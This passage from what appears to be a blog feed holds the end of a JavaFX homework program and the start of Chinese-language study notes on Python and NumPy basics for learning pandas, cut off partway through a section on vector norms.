        chartBox<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>barChart<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>chartBox<span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        chartStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        chartStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"Bar Chart"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        chartStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">showAlert</span><span class="token punctuation">(</span><span class="token class-name">String</span> title<span class="token punctuation">,</span> <span class="token class-name">String</span> message<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Alert</span> alert <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Alert</span><span class="token punctuation">(</span><span class="token class-name">Alert<span class="token punctuation">.</span>AlertType</span><span class="token punctuation">.</span><span class="token constant">INFORMATION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        alert<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span>title<span class="token punctuation">)</span><span class="token punctuation">;</span>
        alert<span class="token punctuation">.</span><span class="token function">setHeaderText</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        alert<span class="token punctuation">.</span><span class="token function">setContentText</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
        alert<span class="token punctuation">.</span><span class="token function">showAndWait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>staffDao <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            staffDao<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Pandas笔记-1-预备知识</title>
    <url>/2022/10/15/16-30-13/</url>
    <content><![CDATA[<p>最近对数据分析有些兴趣，在有了一定了解之后，我选择了<a href="https://github.com/datawhalechina/joyful-pandas">joyful-pandas</a>作为我的入门课程。<br>
python基础、numpy基础</p>
<span id="more"></span>
<h2 id="预备知识"><a class="markdownIt-Anchor" href="#预备知识"></a> 预备知识</h2>
<h2 id="python基础"><a class="markdownIt-Anchor" href="#python基础"></a> Python基础</h2>
<h3 id="列表推导式与条件赋值"><a class="markdownIt-Anchor" href="#列表推导式与条件赋值"></a> 列表推导式与条件赋值</h3>
<p>可以用这种方式生成一个列表</p>
<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">L=[]
for i in range(10)
    L.append(i)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>可以利用列表推导式进行简化，形如<code>[* for i in *]</code>。第一个<code>*</code>为映射函数，其输入为<code>i</code>，第二个<code>*</code>为迭代的对象。</p>
<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">[i for i in range(10)]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>列表表达式支持多层嵌套，如</p>
<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">[func(i,j) for i in ['a','b'] for j in ['1','2']]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>其中前面的为外层，后面的为内层。</p>
<p>另一个实用的语法糖形如<code>value = a if condition else b</code>，类似于C的<code>value = condition ? a : b</code></p>
<h3 id="匿名函数和map方法"><a class="markdownIt-Anchor" href="#匿名函数和map方法"></a> 匿名函数和map方法</h3>
<p>当我们不关心一个函数的名字的时候可以使用匿名函数。如</p>
<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">[(lambda x: 2*x)i for i in range(5)]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可以使用<code>map</code>函数完成这一功能，其返回<code>map</code>对象，需要<code>list</code>转为列表</p>
<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">list(map(lambda x: 2*x,range(5)))
#对于多个输入值的函数映射，可以通过追加迭代对象实现
list(map(lambda x, y: str(x)+'_'+y, range(5), list('abcde')))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="zip对象与enumerate方法"><a class="markdownIt-Anchor" href="#zip对象与enumerate方法"></a> zip对象与enumerate方法</h3>
<p><code>zip</code>函数将多个可迭代对象打包为元组，返回<code>zip</code>对象，通过<code>tuple</code>，<code>list</code>可以得到相应的打包结果。</p>
<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">L1, L2, L3 = list('abc'), list('def'), list('hij')
zipped = list(zip(L1, L2, L3))
tuple(zip(L1, L2, L3))
dict(zip(L1, L2))#这样可以对两个列表建立字典映射<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>循环迭代可以用<code>zip</code>函数。</p>
<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">for i, j, k in zip(L1, L2, L3):
     print(i, j, k)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>可以通过<code>*</code>操作符与<code>zip</code>联合使用来进行解压操作。<code>list(zip(*zipped))</code><br>
<code>enumerate</code>可以在迭代时绑定迭代元素的遍历序号。</p>
<h2 id="numpy基础"><a class="markdownIt-Anchor" href="#numpy基础"></a> Numpy基础</h2>
<h3 id="np数组的构造"><a class="markdownIt-Anchor" href="#np数组的构造"></a> np数组的构造</h3>
<p>最一般的<code>np.array()</code><br>
以下是一些特殊数组的生成：</p>
<ul>
<li>等差序列<br>
<code>np.linespace(起始、终止（含）、样本个数)</code><strong><code>np.arange(起始、终止（不含）、步长)</code></strong></li>
<li>特殊矩阵<br>
<code>np.zeros(传入元组表示各维度大小)</code><br>
<code>np.eye(n)</code><strong>n*n的单位矩阵</strong><br>
<code>np.eye(n,k = m)</code>n*n，偏移主对角线m个单位的伪单位矩阵<br>
<code>np.full(元组传入大小, 填充数值)</code>全为填充数值的矩阵<br>
<code>np.full(元组传入大小, 列表)</code>每行填入相同的列表</li>
<li>随机矩阵<br>
<code>np.random.rand(n)</code>生成0-1<strong>均匀分布</strong>的n个随机数<br>
<code>np.random.rand(a,b)</code>传入的不是元组，每个维度的大小<strong>分别输入</strong>。可以通过<code>(b - a) * np.random.rand(n) + a</code>来生成<code>a</code>到<code>b</code>的均匀分布。但已有此库函数<code>np.random.uniform(a,b,n)</code><br>
<code>np.random.randn(d1,d2,···)</code>生成<code>N(0,I)</code>的标准正态分布.可以通过<code>u + np.random.randn(n) * sigma</code>，已有此库函数<code>np.random.normal(u,sigma,n)</code><br>
<code>np.random.randint(最小值,最大值（不含）,维度大小（元组传入）)</code>随机整数矩阵<br>
<code>np.random.choice(列表,size=（结果大小）,replace=（是否放回，默认True为放回抽样）,p=概率列表（默认均匀采样）)</code><br>
<code>np.random.seed(整数)</code>随机种子，用以固定随机数的输出结果</li>
</ul>
<h3 id="np数组的变形与合并"><a class="markdownIt-Anchor" href="#np数组的变形与合并"></a> np数组的变形与合并</h3>
<ul>
<li>转置<br>
<code>matrix.T</code>转置matrix</li>
<li>合并<br>
<code>matrix.r_[m1,m2]</code>对二维数组而言，上下合并<br>
<code>matrix.c_[m1,m2]</code>对二维数组而言，左右合并<br>
一维数组和二维数组进行合并时，应当把其视作<strong>列向量</strong>，在<strong>长度匹配的情况下只能够使用左右合并的<code>c_</code>操作</strong></li>
<li>维度变换<br>
<code>matrix.reshape(d1,d2,···)</code>有两种模式，为C和F，分别以逐行和逐列的顺序填充读取<code>matrix.reshape((d1,d2,···),order='C'（默认为C）)</code>。由于被调用的数组的大小是确定的，允许有一个维度空缺，形如<code>matrix.reshape(-1,d2)</code>。可以以这种方式<code>m.reshape(-1)</code>将n*1的数组转为一维数组</li>
</ul>
<h3 id="np数组的切片与索引"><a class="markdownIt-Anchor" href="#np数组的切片与索引"></a> np数组的切片与索引</h3>
<p>数组的切片模式支持使用<code>slice</code>类型的<code>start:end:step</code>切片，还可以直接传入列表指定某个维度的索引进行切片,如<code>m[:-1,[0,2]]</code>。也可以使用<code>np.ix_</code>在对应的维度上使用布尔索引，但不可与<code>slice</code>同时使用,如<code>m[np.ix_([True,False,True])]</code>。一维数组可以直接布尔索引</p>
<h3 id="常用函数"><a class="markdownIt-Anchor" href="#常用函数"></a> 常用函数</h3>
<ul>
<li><code>where</code><br>
一种条件函数，可以指定满足条件与不满足条件位置对应的填充值，如<code>np.where(a&gt;0（条件）,a（真）,5（假）)</code></li>
<li><code>nonzero</code>,<code>argmax</code>,<code>argmin</code><br>
<code>nonzero</code>返回非零数的索引。<code>argmax</code>，<code>argmin</code>分别返回最大和最小数的索引,如<code>m.nonzero()</code></li>
<li><code>any</code>,<code>all</code><br>
<code>any</code>指当序列至少 <strong>存在一个</strong> <code>True</code>或非零元素时返回<code>True</code>，否则返回<code>False</code><br>
<code>all</code>指当序列元素 <strong>全为</strong> <code>True</code>或非零元素时返回<code>True</code>，否则返回<code>False</code><br>
如<code>a.any()</code></li>
<li><code>cumprod</code>, <code>cumsum</code>, <code>diff</code><br>
<code>cumprod</code>, <code>cumsum</code>分别表示累乘和累加函数，返回同长度的数组，<code>diff</code>表示和前一个元素做差，由于第一个元素为缺失值，因此在默认参数情况下，返回长度是原数组减1。如<code>a.comprod()</code></li>
<li>统计函数<br>
<code>m.max()</code><br>
<code>np.quantile(m,k)</code>k分位数<br>
如果数组中含有缺失值，返回结果为缺失值，如需略过，在函数名前加<code>nan</code>，如<code>np.nanmax(m)</code><br>
<code>np.cov(m1,m2)</code>协方差<br>
<code>np.corrcoef(m1,m2)</code>相关系数<br>
统计函数中有<code>axis</code>参数，能够进行某个维度的统计特征计算，<code>axis=0</code>列，<code>axis=1</code>行</li>
</ul>
<h3 id="广播机制"><a class="markdownIt-Anchor" href="#广播机制"></a> 广播机制</h3>
<p>用于处理两个不同维度数组之间的操作。</p>
<ul>
<li>标量和数组的操作<br>
标量与数组运算，标量扩容到数组大小后<strong>逐元素</strong>操作，如<code>m=1/m</code></li>
<li>二维数组之间的操作<br>
当两个数组维度完全一致时，使用对应元素的操作，否则会报错，除非其中的某个数组的维度是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>×</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">m×1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>或者<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>×</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1×n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>，那么会扩充其具有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>的维度为另一个数组对应维度的大小。例如，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>×</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">1×2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>数组和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mo>×</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">3×2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>数组做逐元素运算时会把第一个数组扩充为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mo>×</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">3×2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>，扩充时的对应数值进行赋值。但是，需要注意的是，如果第一个数组的维度是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>×</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">1×3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>，那么由于在第二维上的大小不匹配且不为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>，此时报错。(能扩容就扩容，不好扩容就报错)</li>
<li>当一维数组<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">A_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>与二维数组<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mrow><mi>m</mi><mo separator="true">,</mo><mi>n</mi></mrow></msub></mrow><annotation encoding="application/x-tex">B_{m,n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05017em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>操作时，等价于把一维数组视作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mrow><mn>1</mn><mo separator="true">,</mo><mi>k</mi></mrow></msub></mrow><annotation encoding="application/x-tex">A_{1,k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>的二维数组，使用的广播法则与【b】中一致，当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo stretchy="false">!</mo><mo>=</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">k!=n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">!</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>且<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo separator="true">,</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">k,n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span></span></span></span>都不是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>时报错。</li>
</ul>
<h3 id="向量与矩阵的计算"><a class="markdownIt-Anchor" href="#向量与矩阵的计算"></a> 向量与矩阵的计算</h3>
<ul>
<li>
<p>向量内积<code>dot</code><br>
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">a</mi><mo>⋅</mo><mi mathvariant="bold">b</mi><mo>=</mo><msub><mo>∑</mo><mi mathvariant="normal">i</mi></msub><msub><mi mathvariant="normal">a</mi><mi mathvariant="normal">i</mi></msub><msub><mi mathvariant="normal">b</mi><mi mathvariant="normal">i</mi></msub></mrow><annotation encoding="application/x-tex">\rm \mathbf{a}\cdot\mathbf{b} = \sum_ia_ib_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0497100000000001em;vertical-align:-0.29971000000000003em;"></span><span class="mord"><span class="mord"><span class="mord mathbf">a</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathbf">b</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16779199999999994em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathrm mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathrm">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31750199999999995em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathrm mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathrm">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31750199999999995em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathrm mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span><br>
<code>a.dot(b)</code></p>
</li>
<li>
<p>向量范数和矩阵范数<code>np.linalg.norm</code></p>
<ul>
<li>向量范数<br>
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">L_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>范数（也称0范数）<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">∣</mo><mrow><mo fence="true">∣</mo><mi>x</mi><mo fence="true">∣</mo></mrow><mo fence="true">∣</mo></mrow><mo>∗</mo><mn>0</mn><mo>=</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">\left| \left| x \right| \right|*{0}=n
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mclose delimcenter" style="top:0em;">∣</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord"><span class="mord">0</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p>
其中n为非零元的个数<br>
<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>∗</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">L*{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord"><span class="mord">1</span></span></span></span></span>范数（也称和范数或1范数）<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">∣</mo><mrow><mo fence="true">∣</mo><mi>x</mi><mo fence="true">∣</mo></mrow><mo fence="true">∣</mo></mrow><mo>∗</mo><mn>1</mn><mo>=</mo><mo>∑</mo><mo>∗</mo><msup><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>m</mi></msup><mrow><mo fence="true">∣</mo><msub><mi>x</mi><mi>i</mi></msub><mo fence="true">∣</mo></mrow><mo>=</mo><mrow><mo fence="true">∣</mo><msub><mi>x</mi><mn>1</mn></msub><mo fence="true">∣</mo></mrow><mo>+</mo><mo>⋯</mo><mo>+</mo><mrow><mo fence="true">∣</mo><msub><mi>x</mi><mi>m</mi></msub><mo fence="true">∣</mo></mrow></mrow><annotation encoding="application/x-tex">\left| \left| x \right| \right|*{1}=\sum*{i=1}^{m}\left | x_{i} \right |  =\left | x_{1}  \right | + \cdots  